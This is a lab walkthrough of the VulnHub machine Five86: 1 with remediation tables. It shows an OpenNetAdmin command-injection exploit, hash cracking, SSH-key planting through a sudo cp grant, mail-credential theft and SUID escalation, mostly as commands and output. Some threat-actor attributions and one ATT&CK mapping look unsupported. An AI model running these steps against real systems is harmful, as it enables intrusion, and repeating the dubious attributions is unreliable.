# Five86: 1 — Four Users, One Root, Zero Mercy

Alright guys!! Five86: 1 is the kind of lateral-movement puzzle that teaches you how real post-exploitation works when you have to chain through multiple users before reaching root. OpenNetAdmin gives you the initial shell, a crunchable .htpasswd hash gives you douglas, a sudo cp abuse gives you jen, an unencrypted email gives you moss, and a custom SUID game binary gives you root. Four privilege boundaries crossed using four completely different techniques. Goated machine design, no cap.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Five86: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/five86-1,417/ |
| **Techniques** | Nmap, robots.txt disclosure, OpenNetAdmin fingerprinting, CVE-2019-26043 (ONA RCE), .htpasswd credential discovery, crunch targeted wordlist, John the Ripper, sudo cp abuse for SSH key planting, mail credential disclosure, SUID binary escalation |
| **CVEs** | CVE-2019-26043 (OpenNetAdmin 18.1.1 Remote Code Execution), CWE-269 (Improper Privilege Management: sudo cp), CWE-312 (Cleartext Storage of Sensitive Information: mail) |
| **APT Groups** | APT28: uses web application RCE for initial access and chained lateral movement across user accounts; FIN7: exploits misconfigured sudo rules as a primary privilege escalation technique in Linux environments |

---

## Attack Summary

```
nmap → HTTP/80 only
  → robots.txt → Disallow: /ona → OpenNetAdmin 18.1.1
  → searchsploit → EDB-47772 (ONA RCE) → Metasploit → www-data
  → /var/www/html/reports/.htaccess → AuthUserFile /var/www/.htpasswd
  → .htpasswd: douglas → hash + hint "10 chars from: aefhrt"
  → crunch 10 10 aefhrt → john → fatherrrrr
  → SSH douglas → sudo -l → (jen) NOPASSWD: /bin/cp
  → plant SSH public key in jen's authorized_keys via sudo cp
  → SSH jen → /var/mail/jen → moss password
  → su moss → find SUID /home/moss/.game/upyourgame
  → ./upyourgame → answer prompts → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Port scan: only HTTP/80 open
2. robots.txt discovery: expose OpenNetAdmin at /ona
3. OpenNetAdmin 18.1.1 fingerprint, find EDB-47772, Metasploit exploitation
4. Post-exploitation: .htaccess reveals .htpasswd path
5. .htpasswd: Apache MD5 hash with character set hint, crunch + John
6. SSH as douglas, enumerate sudo rights, abuse sudo cp to plant SSH key for jen
7. SSH as jen, read /var/mail/jen for moss password
8. su moss, find custom SUID binary, run game to get root

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.126

nmap -sV -sC -p- 192.168.0.126
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Only HTTP open. Web is the entire attack surface. Start with enumeration.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration: robots.txt

```bash
curl http://192.168.0.126/robots.txt
```

```
User-agent: *
Disallow: /ona
```

Navigate to `http://192.168.0.126/ona`. The application banner reads:

```
OpenNetAdmin 18.1.1
```

**Real-world note:** robots.txt is meant to prevent search engine indexing, not to hide content from attackers. Security through obscurity fails here: attackers always check robots.txt. Disallow entries are a map to interesting content, not a barrier.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — OpenNetAdmin RCE: CVE-2019-26043

```bash
searchsploit opennetadmin
# EDB-47772: OpenNetAdmin 18.1.1 — Remote Code Execution (Metasploit)
```

Load the exploit:

```bash
# Copy the Metasploit Ruby module
cp /usr/share/exploitdb/exploits/php/webapps/47772.rb \
  /usr/share/metasploit-framework/modules/exploits/unix/webapp/

msfconsole -q
msf> reload_all
msf> use exploit/unix/webapp/opennetadmin_ping_cmd_injection
msf> set RHOSTS 192.168.0.126
msf> set LHOST 192.168.0.132
msf> exploit
```

Meterpreter session opens as `www-data`.

**What is CVE-2019-26043?** OpenNetAdmin's ping functionality passes unsanitized user input to a shell command. The `host` parameter in the ping module is injected directly into the OS command, allowing arbitrary command execution via classic OS command injection (CWE-78).

**Alternative (no Metasploit):** The Bash PoC is available:

```bash
# EDB-47772 bash PoC:
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" \
  http://192.168.0.126/ona/
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 4 — Credential Discovery: .htpasswd

From the Meterpreter shell, enumerate the web directory structure:

```bash
shell
cat /var/www/html/reports/.htaccess
```

```
AuthUserFile /var/www/.htpasswd
AuthGroupFile /dev/null
AuthName "Restricted Content"
AuthType Basic
Require valid-user
```

Read the .htpasswd file:

```bash
cat /var/www/.htpasswd
```

```
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
# Note embedded in file: password is 10 chars made from: aefhrt
```

The creator embedded a wordlist hint inside the credential file itself. Wild. This dramatically reduces the cracking search space.

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 5 — Crack .htpasswd Hash

The hash type is Apache MD5 (`$apr1$`), which is Hashcat mode 1600 / John format md5crypt.

Generate the targeted wordlist with crunch:

```bash
crunch 10 10 aefhrt -o /root/five86_dict.txt
# Generates all 10-character combinations using only: a, e, f, h, r, t
# Keyspace: 6^10 = 60,466,176 candidates (~60M words)
```

Crack with John:

```bash
# Save hash to file
echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > /root/five86_hash.txt

john --wordlist=/root/five86_dict.txt /root/five86_hash.txt
```

**Recovered password:** `fatherrrrr`

**Alternative with Hashcat:**

```bash
hashcat -m 1600 /root/five86_hash.txt /root/five86_dict.txt -d 1 -w 3 -O
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 6 — SSH as douglas: Enumerate sudo Rights

```bash
ssh douglas@192.168.0.126
# Password: fatherrrrr

sudo -l
```

```
(jen) NOPASSWD: /bin/cp
```

Douglas can run `/bin/cp` as user `jen` without a password. This allows copying any file to any location that `jen` owns. The target: plant an SSH public key in jen's `~/.ssh/authorized_keys`.

```bash
# On attacker: generate keypair
ssh-keygen -t rsa -f /root/.ssh/id_rsa_five86 -N ""

# Copy the public key to target
scp /root/.ssh/id_rsa_five86.pub douglas@192.168.0.126:/tmp/authorized_keys
```

On target as douglas:

```bash
# Ensure jen's .ssh directory exists
sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/authorized_keys
```

**Why does this work?** The file-copy operation runs as jen, so it has write access to jen's home directory. The `cp` binary makes no distinction between "copying data" and "creating a backdoor." This is why file utilities with SUID or sudo rights are critical misconfigurations.

SSH in as jen:

```bash
ssh -i /root/.ssh/id_rsa_five86 jen@192.168.0.126
```

**Real-world note:** Sudo grants for file copy utilities (cp, tee, install, dd) are as dangerous as shell sudo. Each one allows overwriting system files or planting backdoors. APT28 has used sudo cp abuse to plant SSH keys in lateral movement phases.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1098.004 — Account Manipulation: SSH Authorized Keys

---

## Step 7 — Lateral Movement: jen to moss via Mail

The SSH login banner shows new mail for jen:

```bash
cat /var/mail/jen
```

```
From: moss
Subject: Your new account details

Hi jen,

Here are your login details for the new system:
moss:...
Password: ...
```

The email discloses moss's password in plaintext.

```bash
su - moss
# Enter password from email
```

**Real-world note:** Sending credentials via email is a persistent bad practice. Email is rarely encrypted end-to-end, can be forwarded, is often retained in mail server logs, and is accessible to anyone with access to the mail server filesystem. OceanLotus (APT32) specifically searches local mail files during post-exploitation for credential disclosure.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1020 — Automated Exfiltration

---

## Step 8 — Privilege Escalation: moss to root via SUID Binary

```bash
find / -perm -u=s -type f 2>/dev/null
# /home/moss/.game/upyourgame
```

```bash
cd /home/moss/.game
./upyourgame
```

The binary presents a series of YES/NO questions. Answering them correctly drops a root shell:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

Root captured. GG.

**Real-world note:** Custom SUID binaries are consistently among the highest-severity findings in Linux penetration tests. Developers write "convenience" utilities, set SUID, and forget about them. Any custom SUID binary that changes behavior based on user input is a privilege escalation candidate.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential hash | douglas:$apr1$9fgG/hiM$... | /var/www/.htpasswd | John + crunch → fatherrrrr |
| Credential | douglas:fatherrrrr | .htpasswd crack | SSH login |
| SSH key | id\_rsa\_five86 | Generated on attacker | SSH as jen via sudo cp |
| Credential | moss:... | /var/mail/jen | su - moss |
| Root flag | flag.txt | /root/flag.txt | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | robots.txt reveals internal application | robots.txt is a map for attackers, not a security control | Remove sensitive paths from robots.txt; use proper authentication for internal apps |
| 2 | OpenNetAdmin 18.1.1 OS command injection (CVE-2019-26043) | Network management applications are high-value targets; they often run with elevated privileges and have known CVEs | Keep all web applications patched; remove or isolate internal tools |
| 3 | .htpasswd contains wordlist hint in plaintext comment | Credential files should never contain metadata that reduces cracking time | Remove all comments from .htpasswd; use bcrypt with high work factor |
| 4 | sudo cp grants file write to another user's home | File copy utilities with sudo rights allow SSH backdoor planting without password | Remove all sudo grants for file copy utilities; use dedicated key management tooling |
| 5 | Credentials sent in plaintext email | Email credential disclosure is a consistent post-exploitation finding | Use secure channels for credential distribution; encrypt email; enforce MFA |
| 6 | Custom SUID binary runs as root based on interactive input | SUID binaries with user-controllable behavior are privilege escalation candidates | Audit all SUID binaries; remove the SUID bit from custom utilities |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application (ONA RCE) | T1190 |
| Credential Access | Credential Access | Credentials in Files (.htpasswd) | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Privilege Escalation | Abuse Elevation Control: Sudo (cp) | T1548.003 |
| Lateral Movement | Lateral Movement | SSH Authorized Keys Manipulation | T1098.004 |
| Credential Access | Credential Access | Credentials in Files (mail) | T1552.001 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Upgrade or remove OpenNetAdmin** — CVE-2019-26043 is patched in later versions; if ONA is not needed, remove it entirely
2. **Remove credential hints from .htpasswd** — never embed comments with character set hints; use bcrypt with a high cost factor
3. **Remove sudo grants for cp and similar utilities** — file copy utilities with sudo rights are equivalent to write access to the entire filesystem
4. **Disable SSH password auth; distribute keys securely** — never send SSH passwords via email; use a PAM or SSH CA solution
5. **Audit and remove SUID from custom binaries** — no custom binary should have the SUID bit unless absolutely required and audited

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web applications; track versions against CVE databases |
| Protect | Access Control | Remove sudo cp grants; restrict SUID bits; disable anonymous email credential distribution |
| Protect | Data Security | Remove .htpasswd comments; encrypt sensitive email; no credentials in mail |
| Detect | Anomalies and Events | Alert on sudo usage for file copy; detect SSH key additions to authorized\_keys |
| Respond | Response Planning | Patch ONA; rotate all credentials in the chain; audit authorized\_keys for all users |
| Recover | Recovery Planning | Rebuild compromised host; audit all users and SSH keys |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Remove sudo cp; restrict SUID bits |
| AC-6 | Least Privilege | No file-copy utilities in sudoers; no custom SUID binaries |
| IA-5 | Authenticator Management | No credentials in email; use SSH CA or Vault for key distribution |
| CM-7 | Least Functionality | Remove ONA if not in use; disable unused services |
| SC-28 | Protection of Information at Rest | No credentials in .htpasswd comments or mail files |
| SA-11 | Developer Security Testing | Code review for SUID privilege escalation in custom binaries |

### CISA KEV

CVE-2019-26043 (OpenNetAdmin RCE) is a known actively-exploited vulnerability class. Organizations running OpenNetAdmin are advised to apply patches or remove the application per CISA guidance on web application security.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (patch ONA; bcrypt passwords; remove sudo cp)
- **D3-OAM** — Operating System Administrative Management (audit SUID; restrict sudo)
- **D3-NM** — Network Monitoring (detect lateral movement between user accounts)

---

## Final Thoughts

Five86: 1 is a masterclass in chained lateral movement. Every technique here (ONA RCE, .htpasswd cracking, sudo cp SSH key planting, mail credential disclosure, SUID binary) is a real-world finding with real-world impact. The machine teaches the discipline of checking sudo rights, searching for SUID binaries, and reading mail files at each privilege level. Each user account is a boundary, and each boundary has a different bypass. This is exactly how real post-exploitation on a multi-user Linux system looks. Top-tier training value, dude.

Thanks guys!! (❍ᴥ❍ʋ)
